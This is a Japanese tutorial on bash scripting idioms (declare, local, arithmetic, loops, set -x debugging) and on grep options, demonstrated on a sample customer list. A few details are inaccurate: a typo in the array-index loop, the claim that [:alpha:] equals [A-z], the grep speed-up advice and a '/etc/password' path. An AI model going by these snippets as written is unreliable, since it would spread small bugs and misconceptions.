シェルスクリプトでは変数の型を指定する必要はありませんが、指定しておくことで、間違った値を代入することがなくなり、しいてはバグが減ります。\n変数を数値として宣言する\niオプションを使用します。\ndeclare -i num=1+2 str=1+2 echo $num # =\u0026gt; 3 echo $str # =\u0026gt; 1+2 変数を配列として宣言する\naオプションを使用します。\ndeclare -a array=( Java Ruby Python ) echo ${array[0]} # =\u0026gt; Java echo ${#array[*]} #=\u0026gt; 3(配列の要素数) for e in ${array[*]} do echo $e # =\u0026gt; Java, Ruby, Pythonの順に出力 done for i in ${!array{*}} do echo ${array[i]} # =\u0026gt; Java, Ruby, Pythonの順位出力 done 変数を定数（読み取り専用）とし、初期化時に値を代入する\n-r オプションを使います。\n#!/usr/bin/bash set -ueo pipefail declare -r num=5; str=$((num+2)); echo $num # =\u0026gt; 5 echo $str # =\u0026gt; 7 ヒント プログラムを動作させるための固定値（処理中に変更の必要のない値）は declare -r をつけておくと、バグとなる心配が少し減ります。なぜ変更の必要がないのかということも併せてコメントに追記しておくと、良いと思います。 ローカル変数を定義する シェルスクリプトはどこで宣言しようとすべてグローバル変数として扱われますが、localをつけることによって、明示的にもローカル変数を定義することができます。\nfunction fn() { # 問題のある例: local hoge=$(false) # $? で直前に実行したコマンドの終了ステータスを参照できる echo $? # =\u0026gt; エラーが握りつぶされ 0 が返る！ # 問題のない例: local hoge2 hoge2=$(false) echo $? # =\u0026gt; 正しく 1 が返る } ヒント local は関数の中でしか使わない局所的な変数に使います。\nlocal を付けることで「他の関数では使わない」という意識が明確になるので、平たいわかりやすいプログラムを書くことができます。ローカル変数の場合は、省略せずに定義しましょう。 インクリメント インクリメントなどは以下のように書くことができます。\n一般的な書き方\n#!/usr/bin/bash set -ueo pipefail value=0; value=`echo \u0026#34;$value+1\u0026#34; | bc`; echo \u0026#34;valueの値は \u0026#34; $value; スッキリとした書き方\n#!/usr/bin/bash set -uo pipefail # eをつけると動きません declare -i value=0; ((value++)); echo \u0026#34;valueの値は\u0026#34; $value; ヒント プログラムの文字数は少なければ少ないほどスッキリと見え、デバッグの際にバグの発見に効果的です。\nインクリメント一つをとっても、`(( COUNT++ )) とシンプルに書く癖をつけましょう。 if C言語やJavaのような条件式で記述する メリットは以下のとおりです。\n・半角空白を配置する必要がない\n・一般的に短い行で記述できるようになる\n・条件式の変数に「$」を付ける必要がない\n・-gt は \u0026gt;、 -lt は \u0026lt;、-leは\u0026lt;=、で普通に記述できる\n一般的な記述\n#!/usr/bin/bash set -ueo pipefail x=4; if [ \u0026#34;$x\u0026#34; -gt 2 ] \u0026amp;\u0026amp; [ \u0026#34;$x\u0026#34; -le 5 ]; then echo \u0026#34;$x は 2 より大きいかつ 5 以下です\u0026#34;; fi 拡張した記述\n#!/usr/bin/bash set -ueo pipefail x=4; if ((x\u0026gt;2 \u0026amp;\u0026amp; x\u0026lt;=5)); then echo \u0026#34;$x は 2 より大きいかつ 5 以下です\u0026#34;; fi ヒント bash の if文は 記述が冗長になりがちです。\n多くのプログラミング言語共通の書き方にすることで、bash固有の記述を覚える必要も少なくなります。\nシンプルな記述方式を書くことをおすすめします。 while C言語やJavaのような条件式で記述する スッキリとした書き方\n#!/usr/bin/bash set -ueo pipefail declare -i i=0; while((i++\u0026lt;10));do echo $i; done for C言語やJavaのような条件式で記述する スッキリとした書き方\n#!/usr/bin/bash set -ueo pipefail for((i=1;i\u0026lt;=10;i++));do echo $i; done doやdoneを使わないもっとスッキリとした書き方\n#!/usr/bin/bash set -ueo pipefail for((i=1;i\u0026lt;=10;i++)){ echo $i; } ヒント bash の if文同様、for文も記述が冗長になりがちです。\n多くのプログラミング言語共通の書き方にすることで、bash固有の記述を覚える必要も少なくなります。\nシンプルな記述方式を書くことをおすすめします。 grepで該当文字列があったら反応する # 一般的には以下のようにします。 if cat hoge.txt | grep \u0026#34;Apple\u0026#34; \u0026gt;/dev/null; then echo \u0026#34;hoge.txtにはAppleが含まれた行がある\u0026#34; fi # --quiet は標準出力に何も書き出さないオプション if cat hoge.txt | grep --quiet \u0026#34;Apple\u0026#34;; then echo \u0026#34;hoge.txtにはAppleが含まれた行がある\u0026#34; fi # --quiet と \u0026gt;/dev/null; を組み合わせて高速化する場合 if cat hoge.txt | grep --quiet \u0026#34;Apple\u0026#34; \u0026gt;/dev/null; then echo \u0026#34;hoge.txtにはAppleが含まれた行がある\u0026#34; fi \u0026lt;div class=\u0026#34;tips-area tips\u0026#34;\u0026gt; ヒント : 結局、bashはCやJavaと比べて処理速度が遅いのです。 ボトルネックの多くは、ファイルの入出力や標準出力に書き出すコストです。 `--quiet` で標準出力を抑制し、さらに /dev/null へ捨てる処理を加えることで、処理速度が高まります。 \u0026lt;/div\u0026gt; # 条件の反転は ! をつける if ! cat hoge.txt | grep --quiet \u0026#34;Apple\u0026#34;; then echo \u0026#34;hoge.txtにはAppleが含まれた行がない\u0026#34; fi 長い行の改行について 長い行の改行はバックスラッシュを末尾につける\naws --region ap-northeast-1 cloudformation deploy \\ --template-file ./packaged-template.yaml \\ --stack-name example-stack \\ --capabilities CAPABILITY_IAM \\ --parameter-overrides \\ Environment=development \\ EnableDebugLog=true 驚いたことに（僕も驚きました）パイプラインでの改行はエスケープがいらないのです。\ncat access.log | # IPアドレスのカラムを取得する awk \u0026#39;{print $5}\u0026#39; | # 100行目以降のみを集計対象とする tail +100 | # IPアドレスごとのアクセス数のランキングを集計する sort | uniq -c | sort -nr ヒント bashはコマンドをパイプで連結して処理することが最大の特徴ではありますが、プログラコードが画面の端で折り返したりして可読性が低くなりがちなことがデメリットです。\nおおよそ８０文字程度で改行できればよいのですが、パイプで連結していることから、どこで改行してよいやら迷いがちです。\n処理の中で適宜改行するために、エスケープ \\ で 改行、またはパイプのある場所で改行することをおすすめします。\n紹介したとおり、パイプ | の直後での改行にエスケープ \\ は不要です。\nわかりやすい可読性の高いプログラムコードを書くことを常に意識することが大切です。 関数パラメータは変数に格納する 関数に渡された値は $1,$2\u0026hellip;というふうにアクセスできます。\nとはいえ、関数の中で $1,$2を使うとなにがなんだかわかりにくくなります。\nですので、関数冒頭で変数に格納しましょう。\nもちろん忘れずに変数にはlocal 変数をつけましょう。\n変数の型がわかっているのであれば（わかっているでしょう）、declare -i などで明示的に変数の型を指定するのが望ましいのです。\nfunction do_something() { # まず最初に引数を意味のある命名の変数に取り出す local target_dir; local action target_dir=$1; action=$2; } ヒント ソースコードの中に $1 とか $2とか書かれても、パット見たときに、$1にどんな値が入っているのかわかりません。\nわかりやすくするために、関数の冒頭で、 `local value=\u0026quot;$1\u0026quot;; のように丁寧に変数を作り代入することで、可読性が増し、それによりバグも減ります。わかりにくいコードを書くからバグの発見に時間がかかる場合が多いのです。 スクリプトのデバッグ Bashは広範なデバッグ機能を提供しています。\nデバッグの方法は３種類あります\n１．ターミナルの実行時に -x オプションを付与する\n$ bash -x helloScript.sh ２．ソースコードの冒頭のシェバンに -x オプションを付与する\n#!/bin/bash -x : : ３．デバッグの開始点と終了点を決めてデバッグ\nデバッグの開始点にコマンド \u0026lsquo;set -x\u0026rsquo;終了点には \u0026lsquo;set +x\u0026rsquo; と書きます。\n#!/bin/bash set -x echo \u0026#34;置き換えたいファイル名を入寮して下さい。\u0026#34; read fileName set +x if [[ -f \u0026#34;$fileName\u0026#34; ]]; then sed -e \u0026#34;s/Linux/Unix/g\u0026#34; \u0026#34;$fileName\u0026#34;; else echo \u0026#34;$fileName はありません。\u0026#34;; fi $ bash test + echo 置き換えたいファイル名を入寮して下さい。 置き換えたいファイル名を入寮して下さい。 + read fileName grepfile.txt + set +x This is Unix This is Windows This is MAC This is Unix This is Windows This is MAC This is Unix This is Windows This is MAC This is Unix This is Windows This is MAC $ #!/bin/bash # デバッグ開始 set -x var1=`date +%M` # デバッグ終了 set +x var2=`ls -1 | wc -l` var3=\u0026#34;DEBUG TEST\u0026#34; exit 0 $ bash debug3.sh ++ date +%M + var1=56 + set +x $ デバッグモードのフラグを使う ソースの冒頭で宣言したDEBUG変数が TRUEのときだけ出力したいということはよくあります。\n逆に言えば、DEBUGモードがFALSEのときは、出力してほしくないということです。\n#!/bin/bash # デバッグのときは TRUE そうでないときは FALSE に DEBUG=\u0026#34;TRUE\u0026#34;; declare -i var=10; if [ \u0026#34;$DEBUG\u0026#34; == \u0026#34;TRUE\u0026#34; ];then echo \u0026#34;$var\u0026#34; # デバッグのときだけ出力 fi exit 0 10 ヒント 開発しているときは、プログラムの進捗を確認するために出力はいろいろあってもよいけど、本番稼働のときは、出力はしてほしくないときにとても便利です。 マルチラインコメント マルチラインコメントとは「複数行コメント」のことです。\nbashではさまざまな方法で複数行コメントを使用できます。\n次の例に簡単な方法を示します。\n\u0026lsquo;multiline-comment.sh\u0026rsquo;という名前の新しいbashを作成し、次のスクリプトを追加します。\nここでは、「:」と「\u0026rsquo;」でbashで複数行コメントを実現しています。\n次のスクリプトは、5の2乗を計算します。\nヒント 「:」と「\u0026rsquo;」の間は半角スペースを入れます。 #!/bin/bash : \u0026#39; 次のスクリプトは、 数値の2乗値5を計算します。 \u0026#39; ((area=5*5)); echo \u0026#34;$area\u0026#34;; bashコマンドでファイルを実行します。\n$ bash multiline-comment.sh 25 $ ヒント マルチラインコメントの存在は、ほぼ知られていません。 ほとんどの人は、行頭に「#」をならべて複数行コメントを行う。 それは、過去のメジャーソースコードの冒頭にそうあるからです。 そう、UNIX/Linuxの開発者のほとんどは、マルチラインコメントを知らないのです。 以降、紹介するファイル生成コマンド touch は、「:\u0026gt;ファイル名」で、空のファイルを生成する事ができます。 「:」は、”なにもしないことを示します。 if文の中で何もしない場合は、以下のように記述する。 if [ \u0026ldquo;$v\u0026rdquo; -eq 5 ];then\n: fi なにもしない「:」がないと、ifの条件で実行される本文がないというエラーが吐き出されます。\nbashでは、なにもしないという振る舞いも明確に指定する必要があるのです。 touchは既にファイルがあれば、そのファイルにはさわらない。 :\u0026gt; は既にファイルがあれば、そのファイルさえも空にする。 上記 if 文の中の : は　何もしないことを示す。 マルチラインコメントも同じ「:」から始まり、何もしないことを示している。 ヒント touch コマンドは既にファイルが存在すれば、そのファイルに変更を加えません。 :\u0026gt; と touch の違いは、:\u0026gt; は既にファイルがあっても、そのファイルを空にして初期化します。 grep のTIPS grep（グレップ）コマンド。\nUNIX/Linuxにおいてこれほど歴史あり、強力なコマンドはありません。\nそして多くのユーザーがこのコマンドを使いこなしています。\nWebサーバーのログから特定のユーザーのみを抽出する小さなスクリプトから、膨大なシステムログからロケットの軌道を修正するために必要な要素をリアルタイムに抽出し計算する処理プログラムなど、半世紀もの長い間、一糸乱れることなく、ありとあらゆるところでgrepコマンドは動き続けています。\ngrepコマンドは、文字列、またはファイル内のをテキストを検索するためのコマンドです。\ngrepコマンドの正式な名称は「global regular expression print.」です。\nこのコマンドの名前は、正規表現に基づいてコンテンツを検索できる「g / re / p」に由来しています。\ngrepコマンドには、ファイル内の文字列またはテキストを検索するため、複数の方法が用意されている。\n以下にgrepコマンドを使用するいくつかの構文を示します。\nカラー表示 まず、grep コマンドをカラー表示にしてみます。\n以下のコマンドで、~/.bashrc を開きます。\n$ vim ~/.bashrc 以下の2行を ~/.bashrc に追記して保存して下さい。\nalias grep=\u0026#39;grep --color=auto\u0026#39; alias egrep=\u0026#39;egrep --color=auto\u0026#39; alias fgrep=\u0026#39;fgrep --color=auto\u0026#39; alias ls=\u0026#39;ls -FG\u0026#39;; grep/egrep/fgrep そしてついでに lsコマンドもカラー表示に変更します。変更したら ~/.bashrcを以下のコマンドで再読込します。\n$ . ~/.bashrc $ では、grep コマンドを使ってみます。\nここでは /etc/passwordファイルをgrepしてrootを検索してみます。\n$ grep root /etc/password $ 構文 次のgrepコマンドは、ファイル内の特定の文字列またはテキストを検索するために使用されます。\n$ grep 検索文字列 ファイル名 次のgrepコマンドは、複数のファイル内の特定の文字列またはテキストを検索するために使用されます。\n$ grep 検索文字列 filename1 filename2 filename3 $ 次は、空白を含む文字列を検索します。この場合はシングルクォーテーション「\u0026rsquo;」、またはダブるクォーテーション「\u0026quot;」で文字列を囲む必要があります。\n$ grep \u0026#34;検索文字列 検索文字列\u0026#34; filename1 $ 次のgrepコマンドは、ファイル内の特定のオプションを含む文字列を検索するために使用されます。\ngrep コマンドでは、さまざまな目的でさまざまなオプションが使用されます。\nここでは「-v」を紹介します。\n「-v」オプションは、検索文字列を含まない行を抽出するオプションです。\nこのオプションは、非常に多くの場面で利用されます。\n$ cat /etc/passwd | head ## # User Database # # Note that this file is consulted directly only when the system is running # in single-user mode. At other times this information is provided by # Open Directory. # # See the opendirectoryd(8) man page for additional information about # Open Directory. ## bash-5.1$ cat /etc/passwd | head ## # User Database # # Note that this file is consulted directly only when the system is running # in single-user mode. At other times this information is provided by # Open Directory. # # See the opendirectoryd(8) man page for additional information about # Open Directory. ## $ bash-5.1$ cat /etc/passwd | head | grep \"User\" # User Database $ $ cat /etc/passwd | head | grep -v \"User\" ## # # Note that this file is consulted directly only when the system is running # in single-user mode. At other times this information is provided by # Open Directory. # # See the opendirectoryd(8) man page for additional information about # Open Directory. ## $ まず、\n$ cat /etc/passwd $ で、/etc/passwd ファイルをcat します。\ncat コマンドは、ファイル内容を出力すると言う意味になります。さらに、\n$ cat /etc/passwd | head $ head コマンドは、出力された /etc/passwd ファイルの冒頭１０行を抽出するコマンドです。\nhead コマンドに -n5 オプションをつけることで冒頭5行目を出力することができます。\n$ cat /etc/passwd | head -n5 $ シェルスクリプトは、| パイプでコマンドを連ねることで、前のコマンドに続いて、さらにコマンドの出力結果を絞り込むことができます。\n次のコマンドは、/etc/passwd ファイルを cat コマンドで表示し、head コマンドで冒頭１０行を抽出、さらに grep -v コマンドで User を除く行を出力します。\nhead -n10 と明示的に出力行を指定するほうが可読性が高くなります。\n$ cat /etc/passwd | head | grep -v \u0026#34;User\u0026#34; grep -v コマンドは、指定した文字列を含まない行を抽出するという意味です。\n-v をつけなければ、User という文字列を含む文字列が抽出されることになります。\nさらにgrepには強力な -i オプションがあります。\n-i オプションは、検索文字列の大文字、小文字を区別せずに抽出します。\nbash-3.2$ cat /etc/passwd | head | grep -i \"user\" # User Database # in single-user mode. At other times this information is provided by bash-3.2$ ヒント grep コマンドで最も使われる書式は $ cat \u0026lt;ファイル名\u0026gt; | grep \u0026ldquo;検索文字列\u0026quot;です。 以下、\u0026rsquo;-v\u0026rsquo; \u0026lsquo;-i\u0026rsquo; 二つのオプションをパイプで駆使すればgrepコマンドを使いこなしていると言っても過言ではありません。 -v 除外\n$ cat \u0026lt;ファイル名\u0026gt; | grep -v \u0026ldquo;検索文字列\u0026rdquo; -i 大文字小文字を区別しない\n$ cat \u0026lt;ファイル名\u0026gt; | grep -i \u0026ldquo;検索文字列\u0026rdquo; 一致する文字列を検索 では手始めに、次のコマンドで、Customers.txtファイルの内容を表示します。以下の内容をCustomers.txtとして保存して下さい。\nID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 Customers.txtを表示します。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ 次のgrepコマンドは、Customers.txtファイルのテキスト「Ali」を含む語句の検索をします。検索テキストがファイルに存在する場合、テキストを含む行が出力されます。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep Ali 45 Minhaz Ali ali@gmail.com +8801190761212 $ 次のgrepコマンドは、Customers.txtファイルのテキスト「 MalihaChowdhury 」を検索します。検索テキストがファイルに存在する場合、テキストを含む行が出力されます。\n$ cat Customers.txt | grep 'Maliha Chowdhury' 56 Maliha Chowdhury maliha@gmail.com +8801820001980 $ 一致しない文字列のみを検索 grepコマンドの -v オプションは、ファイルから一致しない文字列を検索するために使用されます。\nこの例では、-vオプションを指定したgrepコマンドを使用して、最初の例で作成したCustomers.txtファイルから一致しない文字列を検索しています。\n次のコマンドは、customers.txtファイルの内容を表示します。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep -v 'Abir' ID Name Email Phone 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ ヒント -vオプションは、ファイルから一致しない文字列を検索するために使用されます。 検索文字列を除外して検索する場合は、\u0026rsquo;-v\u0026rsquo;オプションを使います。\n$ cat \u0026lt;ファイル名\u0026gt; | grep -v \u0026ldquo;検索文字列\u0026rdquo; 大文字と小文字を区別しない一致の検索文字列 grepコマンドは、デフォルトで大文字と小文字を区別してファイルから文字列を検索します。\ngrepコマンドの -i オプションは、大文字と小文字を区別しない方法でファイルから文字列を検索するために使用されます。\nこの例では、-i オプションを指定した grep コマンドを使用して、前に作成したCustomers.txtファイルから大文字と小文字を区別しない方法で特定の文字列を検索しています。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep -i 'minhaz' 45 Minhaz Ali ali@gmail.com +8801190761212 $ ヒント 文字が大文字または小文字の文字列を含む1つ以上の行がファイルに存在する場合、その行が出力されます。 大文字小文字を区別しないで検索する場合は、\u0026rsquo;-i\u0026rsquo;オプションを使います。\n$ cat \u0026lt;ファイル名\u0026gt; | grep -i \u0026ldquo;検索文字列\u0026rdquo; 単語全体のみを検索 grepコマンドの \u0026lsquo;-w\u0026rsquo; オプションは、大文字と小文字を区別してファイルから単語全体を検索するために使用されます。\nこの例では、\u0026rsquo;-w\u0026rsquo; オプションを指定したgrepコマンドを使用して、最初の例で作成されたCustomers.txtファイルから単語全体を検索しています。\n次のコマンドは、customers.txtファイルの内容を表示します。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ 次のgrepコマンドは、文字列「Ma」を含むテキストファイルの行を検索します。ファイルのいずれかの行に文字列「Ma」が含まれている場合、その行が出力されます。\n$ cat Customers.txt | grep 'Ma' 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ 次のgrepコマンドは、「Ma」という単語を含むテキストファイルの行を出力します。\n-wオプションを付けることで、ファイルのいずれかの行に「Ma」という単語がある場合、その行が出力されます。\n以下の例では、「Ma」という単語がないため、出力されません。\n$ cat Customers.txt | grep -w \u0026#39;Ma\u0026#39; $ 次のgrepコマンドは、「Maliha」という単語を含むテキストファイルの行を正確に検索します。\nファイルのいずれかの行に「Maliha」という単語が正確に含まれている場合、その行が出力されます。\n$ cat Customers.txt | grep -w 'Maliha' 56 Maliha Chowdhury maliha@gmail.com +8801820001980 $ ヒント -w オプションと検索語「Ma」を指定したgrepコマンドは、テキストファイルに「Ma」という単語がないため、何も返しませんでした。 -w オプションと検索語「Maliha」を指定したgrepコマンドは、「Maliha」という単語を含むファイルの5行目を返しました。 -w オプションは正確な単語を検索対象とするオプションです。 -w オプションは、「含む」のではなく、合致するかどうかを判定するためのオプションとなります。\n現在のディレクトリで複数のファイルを検索する grepコマンドは、ファイル内の特定のコンテンツを検索し、検索文字列またはパターンに基づいて現在のディレクトリ内の複数のファイルを検索するために使用されます。\n* ワイルドカードは、現在のディレクトリ内にある複数のファイルを検索対象とする方法です。\n次のgrepコマンドは、現在のディレクトリのファイルを再帰的に「split」という単語を含む語句を検索します。\n$ grep -w split * $ ディレクトリを再帰的に検索する \u0026lsquo;-r\u0026rsquo; オプションは、grepコマンドとともに使用して、ディレクトリ内にあるサブディレクトリ内の特定の文字列またはパターンを再帰的に検索します。\nこの例では、grepコマンドを使用して現在のディレクトリを再帰的に検索し、Customers.txtファイルを検索します。\n$ grep -wr split * $ ヒント ディレクトリを指定して再帰的に検索したい場合は、 $ grep -r 検索文字列 検索したい場所となります。 以下の例では、/etc/services のディレクトリ内を再帰的に、kpasswd という語句に合致する行を含むファイルを出力します。 $ grep -wr kpasswd /etc/services /etc/services :56 kpasswd 464/udp # kpasswd /etc/services :56 kpasswd 464/tcp # kpasswd $ 行番号を出力に追加します grepコマンドの \u0026lsquo;-n\u0026rsquo; オプションは、ファイルの行番号とともに検索文字列の出力を出力するために使用されます。\nこの例では、\u0026rsquo;-n\u0026rsquo; オプションを指定したgrepコマンドを使用して、最初の例で作成されたCustomers.txtファイルの行番号を含む検索出力を表示しています。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep -n \"Ali\" 4:45 Minhaz Ali ali@gmail.com +8801190761212 $ 一致する行の後に特定の行数を出力します 数値を含む \u0026lsquo;-A\u0026rsquo; オプションは、ファイル内で見つかった一致する文字列またはパターンの後に特定の行数を出力するために使用されます。\nこの例では、Customers.txtファイルに対してgrepコマンドの \u0026lsquo;-A\u0026rsquo; オプションを使用しています。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep -A2 \"Ali\" 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ 一致する行の前に特定の行数を出力します 数値を含む \u0026lsquo;-B\u0026rsquo; オプションは、ファイル内で一致する文字列またはパターンの前に特定の行数を出力するために使用されます。\nこの例では、Customers.txtファイルに対してgrepコマンドの \u0026lsquo;-B\u0026rsquo; オプションの使用法を示しています。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep -B1 \"Riya\" 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 $ 一致する行の前後の特定の行数を出力 数値を指定した \u0026lsquo;-C\u0026rsquo; オプションは、ファイル内で見つかった一致する文字列またはパターンの前後の特定の行数を出力するために使用されます。\nこの例では、 Customers.txtファイルのgrepコマンドの \u0026lsquo;-C\u0026rsquo; オプションの使用法を示しています。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep -C1 \"Maliha\" 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ ヒント ターミナルから前のコマンドを実行すると、次の出力が表示されます。5行目には、文字列 \u0026lsquo;Maliha\u0026rsquo;が含まれています。4行目は一致する行の前の行で、6行目は一致する行の次の行です。したがって、4行目、5行目、および6行目は、一致する文字列を強調表示することによって出力に出力されています。 ブラケットを使用して特定の数字を一致させる[] 特定の桁の範囲は、角かっこ[]を使用して、grepコマンドの正規表現パターンで定義できます。\nこの例では、Customers.txtファイルのgrepコマンドを使用して特定の数字を検索する方法を示します。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ cat Customers.txt | grep '[3-5]' $ 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 $ ヒント [3-5] は、3,4,5 のいずれかを検索文字列とするという意味となります。 2,3,4,5,6 としたい場合は、 [2-6]となります。 3番目のブラケットを使用してパターンを特定の文字と一致させる[] ファイルの特定の文字は、角かっこ[]を使用してさまざまな方法で一致させることができます。\n角かっこを使用してファイルから特定の行を検索することにより、正規表現パターンで文字の範囲または特定の文字を使用できます。\nこの例では、文字範囲または特定の文字のパターンを使用して、Customers.txtファイル内の特定の文字を検索する方法を示します。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep 'Ma[lr]' 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ ヒント Ma から始まる単語を検索し、さらに続く文字列が \u0026lsquo;[lr]\u0026rsquo; すなわち、l または r である文字列を検索します。いわゆる「Mal」と「Mar」を検索するという意味になります。 [：alnum：]クラスを使用してアルファベットと数字を一致させる [:alnum:]クラスは、アルファベットと数字を照合するために正規表現パターンで使用されます。\nパターン[A-z0-9]に相当します。\n[：alpha：]クラスを使用してアルファベット文字を照合する [:alpha:]クラスは、アルファベット文字のみに一致する正規表現パターンで使用されます。\nパターン[A-z]に相当します。\n[：digit：]クラスを使用して数字を照合する [:digit:]クラスは、正規表現パターンで数字のみに一致するために使用されます。\nパターン[0-9]と同等です。\n[：lower：]クラスを使用して小文字を照合する [:lower:]クラスは、すべての小文字のみに一致するように正規表現パターンで使用されます。\nパターン[a-z]と同等です。\n[：space：]クラスを使用してスペース文字を一致させる [:space:]クラスは、スペース文字を含む行と一致させるために正規表現パターンで使用されます。\nヒント $ grep \u0026ldquo;test(タブ文字)\u0026rdquo; /path/to/file\n:と、入力したい場合は、ctrl-v を入力してからタブを打つと入力される。 \u0026lsquo;[[:space:]]\u0026rsquo; では空白文字もタブ文字もマッチする。\nこれならメモなどからコピペできる。\n$ grep \u0026ldquo;test[[:space:]]\u0026rdquo; /path/to/file また、\n$ grep test$\u0026rsquo;\\t\u0026rsquo; /path/to/file\nであればタブだけがマッチする。\n行頭からの検索 キャレット ^ 記号は行頭を表します。\nファイル内の行頭が、特定の文字または文字列で始まる行と一致します。\nこの記号の使用法は、前に作成されたCustomers.txtファイルのこの例で示されています。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep ^4 45 Minhaz Ali ali@gmail.com +8801190761212 $ ヒント ターミナルから前のコマンドを実行すると、customers.txtファイルには「 4 」で始まる行が1行だけ存在します。これは、出力に出力されたファイルの4行目です。 行の終わりに一致する ドル $ 記号は、ファイル内の特定の文字または文字列の行末を一致させるための正規表現です。\nこの記号の使用法は、前に作成されたCustomers.txtファイルのこの例で示されています。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep 1212$ 45 Minhaz Ali ali@gmail.com +8801190761212 $ ヒント customers.txtファイルには「1212」で終わる行が1行だけ存在します。 連結との一致 正規表現パターンは、複数のパターンを連結することで作成できます。\nドット . は、パターンを連結するために使用されます。\nこの例では、 Customers.txtファイルに対してgrepコマンドと連結して使用する方法を示しています。\n$ cat Customers.txt ID Name Email Phone 11 Md. Abir abir@gmail.com +8801813462458 23 Riya Chakroborti riya@gmail.com +8801937864534 45 Minhaz Ali ali@gmail.com +8801190761212 56 Maliha Chowdhury maliha@gmail.com +8801820001980 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ $ cat Customers.txt | grep -e '[MR].*[Kk]' 23 Riya Chakroborti riya@gmail.com +8801937864534 79 Maruf Sarkar maruf@gmail.com +8801670908966 $ ヒント 